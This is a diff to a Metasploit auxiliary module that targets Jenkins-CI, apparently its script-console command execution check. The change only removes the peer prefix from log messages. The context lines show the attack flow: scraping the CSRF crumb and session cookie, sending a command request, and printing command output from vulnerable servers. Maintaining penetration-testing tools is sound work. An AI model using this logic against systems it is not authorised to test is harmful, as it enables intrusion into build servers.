@@ -51,23 +51,23 @@ class MetasploitModule < Msf::Auxiliary
 
     # Verify that we received a proper systemInfo response
     unless res && res.body.to_s.length > 0
-      vprint_error("#{peer} - The server did not reply to our systemInfo request")
+      vprint_error("The server did not reply to our systemInfo request")
       return
     end
 
     unless res.body.index("System Properties") &&
            res.body.index("Environment Variables")
       if res.body.index('Remember me on this computer')
-        vprint_error("#{peer} This Jenkins-CI system requires authentication")
+        vprint_error("This Jenkins-CI system requires authentication")
       else
-        vprint_error("#{peer} This system is not running Jenkins-CI at #{datastore['TARGETURI']}")
+        vprint_error("This system is not running Jenkins-CI at #{datastore['TARGETURI']}")
       end
       return
     end
 
     host_info = {}
     if (res.body =~ /"\.crumb", "([a-z0-9]*)"/)
-      print_status("#{peer} Using CSRF token: '#{$1}'")
+      print_status("Using CSRF token: '#{$1}'")
       host_info[:crumb] = $1
 
       sessionid = 'JSESSIONID' << res.get_cookies.split('JSESSIONID')[1].split('; ')[0]
@@ -102,14 +102,14 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi(request_parameters)
 
     unless res && res.body.to_s.length > 0
-      vprint_error("#{peer} No response received from the server.")
+      vprint_error("No response received from the server.")
       return
     end
 
     plugin_output, command_output = pattern_extract(/<pre>(.*?)<\/pre>/m, res.body.to_s)
 
     if plugin_output !~ /Jenkins\.instance\.pluginManager\.plugins/
-      vprint_error("#{peer} The server returned an invalid response.")
+      vprint_error("The server returned an invalid response.")
       return
     end
 
@@ -120,10 +120,10 @@ class MetasploitModule < Msf::Auxiliary
 
     if output =~ /^java\.[a-zA-Z\.]+\:\s*([^\n]+)\n/
       output = $1
-      print_good("#{peer} The server is vulnerable, but the command failed: #{output}")
+      print_good("The server is vulnerable, but the command failed: #{output}")
     else
       output.split("\n").each do |line|
-        print_good("#{peer} #{line.strip}")
+        print_good("#{line.strip}")
       end
     end
 
